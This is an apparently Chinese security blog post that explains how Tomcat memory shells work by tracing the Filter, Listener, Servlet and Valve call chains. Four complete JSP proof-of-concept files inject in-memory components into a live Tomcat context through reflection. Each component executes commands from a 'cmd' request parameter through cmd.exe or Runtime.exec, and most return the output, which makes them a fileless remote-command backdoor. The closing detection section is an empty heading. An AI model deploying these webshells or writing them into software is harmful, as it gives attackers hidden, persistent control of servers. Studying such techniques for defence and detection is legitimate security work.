<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> | Hurn's Blog</title><meta name="description" content=" - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">(untitled)</h1><div class="post-info"><a></a>2023-07-22</div><div class="post-content"><h1 id="0x0-内存马"><a href="#0x0-内存马" class="headerlink" title="0x0 内存马"></a>0x0 内存马</h1><p>Tomcat、Spring、JavaAgent</p>
<h1 id="0x1-Tomcat"><a href="#0x1-Tomcat" class="headerlink" title="0x1. Tomcat"></a>0x1. Tomcat</h1><p><strong>Tomcat</strong>是Web应用服务器，也是Servlet/JSP容器，Tomcat 容器由<code>Service</code>、<code>Connector</code>、<code>Container</code>三部分组件组成</p>
<ul>
<li><strong>Service为顶层容器，用来申明一个服务</strong>，每个Tomcat中可以存在多个Service(Service之间相互独立，但共享一个JVM、系统库)，Service中可以包含多个Connector，但只能包含一个Container，例如一个Tomcat中可以运行多个服务，订单服务、支付服务..</li>
<li><strong>Connector，连接器，主要负责处理容器的协议请求相关</strong>，一个服务可以包含多个Connector，例如 AJP协议、Http协议</li>
<li><strong>Container，作为Servlet容器，用来封装和管理Web应用</strong>，包含四种子容器<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code><ul>
<li>Engine，对外提供功能入口，用来管理、包含各个Host</li>
<li>Host，虚拟主机</li>
<li>Context，上下文，可以理解为Web应用，每个Host下面可以包含多个Context(Web应用)</li>
<li>Wrapper，主要用来管理Servlet(一个页面或者路径)的装载、初始化、执行、资源回收</li>
</ul>
</li>
</ul>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><p>创建一个Filter示例，配置好xml文件</p>
<pre><code class="java">package Filter;

import javax.servlet.*;
import java.io.IOException;

public class Demo implements Filter &#123;

    public void init(FilterConfig filterConfig) throws ServletException &#123;
        System.out.println(&quot;Filter Init....&quot;);
    &#125;

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
        System.out.println(&quot;Filter Demo doFilter....&quot;);
        filterChain.doFilter(servletRequest,servletResponse);
    &#125;

    public void destroy() &#123;&#125;
&#125;
</code></pre>
<p>init调用链，分析：</p>
<pre><code>init:9, Demo (Filter)
initFilter:272, ApplicationFilterConfig (org.apache.catalina.core)
getFilter:254, ApplicationFilterConfig (org.apache.catalina.core)
&lt;init&gt;:100, ApplicationFilterConfig (org.apache.catalina.core)
filterStart:4328, StandardContext (org.apache.catalina.core)
startInternal:4961, StandardContext (org.apache.catalina.core)
start:183, LifecycleBase (org.apache.catalina.util)
addChildInternal:710, ContainerBase (org.apache.catalina.core)
addChild:687, ContainerBase (org.apache.catalina.core)
addChild:661, StandardHost (org.apache.catalina.core)
manageApp:1775, HostConfig (org.apache.catalina.startup)
...
</code></pre>
<p>从<code>StandardContext#startInternal</code>开始，<code>this.fireLifecycleEvent</code>初始化web.xml</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724094639164.png" alt="image-20230724094639164"></p>
<p>加载Listener、Filter等</p>
<img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/内存马.assets/image-20230724075833784.png" alt="image-20230724075833784" style="zoom:80%;">

<p>创建FilterConfig</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724080231490.png" alt="image-20230724080231490"></p>
<pre><code class="java">public final class ApplicationFilterConfig implements FilterConfig, Serializable &#123;
    
        ApplicationFilterConfig(Context context, FilterDef filterDef) &#123;
        this.context = context;
        this.filterDef = filterDef;
        if (filterDef.getFilter() == null) &#123;
              // 
            this.getFilter();
        &#125; else &#123;
            this.filter = filterDef.getFilter();
            this.getInstanceManager().newInstance(this.filter);
            this.initFilter();
        &#125;
    &#125;
  
    Filter getFilter() &#123;
        if (this.filter != null) &#123;
            return this.filter;
        &#125; else &#123;
            String filterClass = this.filterDef.getFilterClass();
            this.filter = (Filter)this.getInstanceManager().newInstance(filterClass);
              // 调用初始化
            this.initFilter();
            return this.filter;
        &#125;
    &#125;
</code></pre>
<p><code>this.initFilter()</code>调用自定义创建的Filter的<code>init</code>方法</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724080451136.png" alt="image-20230724080451136"></p>
<p><strong>其中几个关键类：</strong></p>
<ul>
<li><strong>FilterDefs</strong>，存放FilterDef数组，存放着FilterName、FilterClass等信息</li>
</ul>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724080911771.png" alt="image-20230724080911771"></p>
<ul>
<li><strong>FilterConfigs</strong>，存放ApplicationFilterConfig数组，主要包含FilterName和FilterDef对象等信息</li>
</ul>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724081730732.png" alt="image-20230724081730732"></p>
<p>doFilter调用链，分析：</p>
<pre><code>doFilter:13, Demo (Filter)
internalDoFilter:181, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
invoke:167, StandardWrapperValve (org.apache.catalina.core)
invoke:90, StandardContextValve (org.apache.catalina.core)
invoke:483, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:682, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:617, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:932, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1694, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>从<code>StandardWrapperValve#invoke</code>开始分析，每一次请求的大致流程都是，创建filterChain，然后执行filterChain.doFilter</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724100905455.png" alt="image-20230724100905455"></p>
<p>跟进<code>createFilterChain</code>，这里是内存马的主要实现逻辑，<strong>每次请求都从context中获取FilterMap进行URL匹配，如果匹配到了将相应的Filter添加到filterChain中，FilterChain执行所有的Filter的doFilter方法</strong>，也就是如果通过反序列化漏洞获取到context，添加到 context.filterMaps即可实现内存过滤</p>
<pre><code class="java">public final class ApplicationFilterFactory &#123;    
        public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) &#123;
        if (servlet == null) &#123;
            return null;
        &#125; else &#123;
            ApplicationFilterChain filterChain = null;
            if (request instanceof Request) &#123;
                Request req = (Request)request;
                if (Globals.IS_SECURITY_ENABLED) &#123;
                    filterChain = new ApplicationFilterChain();
                &#125; else &#123;
                      // 获取filterChain，每个req都会重新创建filterChain
                    filterChain = (ApplicationFilterChain)req.getFilterChain();
                    if (filterChain == null) &#123;
                        filterChain = new ApplicationFilterChain();
                        req.setFilterChain(filterChain);
                    &#125;
                &#125;
            &#125; else &#123;
                filterChain = new ApplicationFilterChain();
            &#125;

            filterChain.setServlet(servlet);
            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
            StandardContext context = (StandardContext)wrapper.getParent();
              // 从context（web应用）中获取filterMap数组
              // 在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern
            FilterMap[] filterMaps = context.findFilterMaps();
            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;
                                // ...
                String servletName = wrapper.getName();
                FilterMap[] var10 = filterMaps;
                int var11 = filterMaps.length;

                int var12;
                FilterMap filterMap;
                ApplicationFilterConfig filterConfig;
                for(var12 = 0; var12 &lt; var11; ++var12) &#123;
                    filterMap = var10[var12];
                      // 对filter的URL进行匹配
                    if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;
                          // 如果匹配，则根据filterName获取FilterConfig
                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                        if (filterConfig != null) &#123;
                              // 添加至filterChain中
                            filterChain.addFilter(filterConfig);
                        &#125;
                    &#125;
                &#125;

                                // ...

                return filterChain;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>从上面创建好的filterChain，跟进<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code></p>
<pre><code class="java">    public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException &#123;
        if (Globals.IS_SECURITY_ENABLED) &#123;
                    // ...
        &#125; else &#123;
            this.internalDoFilter(request, response);
        &#125;
    &#125;
</code></pre>
<p><code>This.internalDoFilter</code>最终执行filter.doFilter，也就是Demo.doFilter</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724101536991.png" alt="image-20230724101536991"></p>
<p>总结一下，内存马实现步骤：</p>
<ol>
<li>获取到context对象</li>
<li>将构建的恶意的FilterMap，添加到context中</li>
</ol>
<p>POC:</p>
<pre><code class="jsp">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;

&lt;%
    final String name = &quot;Test&quot;;
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null)&#123;
        Filter filter = new Filter() &#123;
            @Override
            public void init(FilterConfig filterConfig) throws ServletException &#123;

            &#125;

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter(&quot;cmd&quot;) != null)&#123;
                    byte[] bytes = new byte[10240];
                    Process process = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                &#125;
                filterChain.doFilter(servletRequest,servletResponse);
            &#125;

            @Override
            public void destroy() &#123;

            &#125;

        &#125;;


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern(&quot;/*&quot;);
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print(&quot;Inject Success !&quot;);
    &#125;
%&gt;
</code></pre>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724110458850.png" alt="image-20230724110458850"></p>
<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p>Listener作为监听器，每一次请求都会运行<code>ServletRequestListener#requestInitialized()</code>函数</p>
<p>测试示例</p>
<pre><code class="java">package Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@WebListener
public class Demo implements ServletRequestListener &#123;
    @Override
    public void requestInitialized(ServletRequestEvent sre) &#123;

        System.out.println(&quot;Listener requestInitialized....&quot;);
    &#125;

    @Override
    public void requestDestroyed(ServletRequestEvent sre) &#123;
    &#125;
&#125;
</code></pre>
<p>调用栈：</p>
<pre><code class="java">requestInitialized:14, Demo (Listener)
fireRequestInitEvent:5654, StandardContext (org.apache.catalina.core)
invoke:116, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:682, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:617, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:932, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1694, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>跟进<code>fireRequestInitEvent</code>，主要逻辑为获取所有Listener对象，遍历执行requestInitialized</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724111631016.png" alt="image-20230724111631016"></p>
<p><code>this.getApplicationEventListeners</code>:</p>
<pre><code class="java">    public Object[] getApplicationEventListeners() &#123;
        return this.applicationEventListenersList.toArray();
    &#125;
</code></pre>
<p>内存马实现：</p>
<ol>
<li>获取Context</li>
<li>编写ServletRequestListener对象，添加进this.applicationEventListenersList数组</li>
</ol>
<p>POC:</p>
<pre><code class="jsp">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;

&lt;%
    ServletRequestListener listener = new ServletRequestListener() &#123;
        public void requestInitialized(ServletRequestEvent sre) &#123;
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter(&quot;cmd&quot;) != null)&#123;
                try &#123;
                    byte[] bytes = new byte[10240];
                    Process process = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(new String(bytes,0,len));
                    process.destroy();
                &#125; catch (Exception e) &#123;
                    throw new RuntimeException(e);
                &#125;
                return;
            &#125;
        &#125;

        public void requestDestroyed(ServletRequestEvent sre) &#123;
        &#125;
    &#125;;

    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    standardContext.addApplicationEventListener(listener);
    response.getWriter().write(&quot;inject success&quot;);
%&gt;
</code></pre>
<p>需要访问一个存在的路径：</p>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724125241645.png" alt="image-20230724125241645"></p>
<h2 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h2><p>示例：</p>
<pre><code class="java">package Servlet;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet(&quot;/test3&quot;)
public class Demo implements Servlet &#123;
    @Override
    public void init(ServletConfig config) throws ServletException &#123;

    &#125;

    @Override
    public ServletConfig getServletConfig() &#123;
        return null;
    &#125;

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if (cmd !=null)&#123;
                try&#123;
                    byte[] bytes = new byte[10240];
                    Process process = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,servletRequest.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                &#125;catch (IOException e)&#123;
                    e.printStackTrace();
                &#125;catch (NullPointerException n)&#123;
                    n.printStackTrace();
                &#125;
            &#125;
        &#125;

    @Override
    public String getServletInfo() &#123;
        return null;
    &#125;

    @Override
    public void destroy() &#123;

    &#125;
&#125;
</code></pre>
<p>调用堆栈:</p>
<pre><code>service:21, Demo (Servlet)
internalDoFilter:212, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
doFilter:51, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:181, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
invoke:167, StandardWrapperValve (org.apache.catalina.core)
invoke:90, StandardContextValve (org.apache.catalina.core)
invoke:483, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:682, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:617, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:932, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1694, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>POC:</p>
<pre><code class="jsp">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;


&lt;%
    Servlet servlet = new Servlet() &#123;

        @Override
        public void init(ServletConfig servletConfig) throws ServletException &#123;

        &#125;

        @Override
        public ServletConfig getServletConfig() &#123;
            return null;
        &#125;

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if (cmd !=null)&#123;
                try&#123;
                    byte[] bytes = new byte[10240];
                    Process process = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,servletRequest.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                &#125;catch (IOException e)&#123;
                    e.printStackTrace();
                &#125;catch (NullPointerException n)&#123;
                    n.printStackTrace();
                &#125;
            &#125;
        &#125;

        @Override
        public String getServletInfo() &#123;
            return null;
        &#125;

        @Override
        public void destroy() &#123;

        &#125;
    &#125;;

    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    String name = servlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servlet.getClass().getName());
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded(&quot;/demo33&quot;,name);
    response.getWriter().write(&quot;inject success&quot;);
%&gt;
</code></pre>
<p><img src="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/CpZO/blog/source/_posts/%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20230724133416373.png" alt="image-20230724133416373"></p>
<h2 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h2><p>当Tomcat请求转发至Container容器后，消息在四个子容器中由管道机制（Pipeline管道和Valve阀门）进行相互传输。</p>
<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p>
<pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;

&lt;%

    ValveBase myValve = new ValveBase() &#123;

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException &#123;
            String cmd = request.getParameter(&quot;cmd&quot;);
            if (cmd != null) &#123;
                try &#123;
                    Runtime.getRuntime().exec(cmd);
                &#125; catch (IOException e) &#123;
                    e.printStackTrace();
                &#125; catch (NullPointerException n) &#123;
                    n.printStackTrace();
                &#125;
            &#125;
        &#125;
    &#125;;


    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    Pipeline pipeline = standardContext.getPipeline();
    pipeline.addValve(myValve);
%&gt;
</code></pre>
<h2 id="内存马回显"><a href="#内存马回显" class="headerlink" title="内存马回显"></a>内存马回显</h2><h2 id="反序列化注入内存马"><a href="#反序列化注入内存马" class="headerlink" title="反序列化注入内存马"></a>反序列化注入内存马</h2><h1 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h1></div></article></div></main><footer><div class="paginator"><a class="next" href="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>